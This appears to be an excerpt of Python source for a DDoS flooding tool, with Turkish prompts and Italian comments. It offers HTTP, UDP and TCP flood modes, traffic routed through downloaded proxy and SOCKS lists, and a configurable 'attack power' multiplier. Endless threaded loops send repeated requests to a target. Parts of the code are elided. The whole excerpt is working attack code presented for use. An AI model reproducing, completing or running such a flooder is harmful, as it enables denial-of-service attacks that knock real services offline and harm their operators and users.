...
def floodmode(): 
	global choice1
	choice1 = input("METHOD: HTTPS '0' /UDP '1' /TCP '2': ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: 
				print("BUNUN ICIN ROOT IZNI GEREIYOR.") 
				exit(0) 	
			else: 
				floodport() 
		except:
		...
		try:
			if os.getuid() != 0: 
				print("BUNUN ICIN ROOT IZNI GEREKIYOR.") 
				exit(0) 	
			else: 
				floodport() 
		except:
...
def proxymode():
	global choice2
	choice2 = input("ENABLE PROXY MODE OR SOCKET NO 'Y/H': ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choicedownproxy():
	choice4 = input("UPDATE PROXY LIST 'Y': ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("UPDATED SOCKET LIST 'Y': ")
	if choice4 == "y":
...
def proxyget(urlproxy): 
	try:
		...
		out_file.close()
		print ("PROXIES DOWNLOAD SUCCESSFULLY")
	except: 
		print ("\nERROR!\n")
	proxylist() 
...
def proxylist():
	global proxies
	out_file = str(input("WHERE PROXIES WORK 'ENTER'  (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input(" THREAD 'ENTER' (800): "))
	except ValueError:
		threads = 800
...
def multiplication():
	global multiple
	try:
		multiple = int(input("ATTACK POWER [(1-5=WEAK)(50=MEDIUM)(100=STRONG)]: "))
	except ValueError:
		print("HATALI Tekrar Dene.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input(" START ATTACK 'ENTER'  : ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": 
		loop()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.send(p) # ed invia
				print (" Paket Yollaniyor " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("ATTACK " + str(proxy[0]+":"+proxy[1]) + " :", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("ATTACK  " + str(proxy[0]+":"+proxy[1]) + " :", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
				...
				try:
					...
					print ("Bu Proxy Kullanilmiyor :", self.counter)
					s.close() # chiude il socket e ricomincia ciclo
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("ATTACK  " + str(proxy[0]+":"+proxy[1]) + " :", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
		...
		while True:
			try:
				...
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					...
					s.connect((str(url2), int(urlport))) # connessione
					s.send (str.encode(request)) # invio
					print ("PROXY" + str(proxy[0]+":"+proxy[1]) + " :", self.counter) # print req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("ATTACK :", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
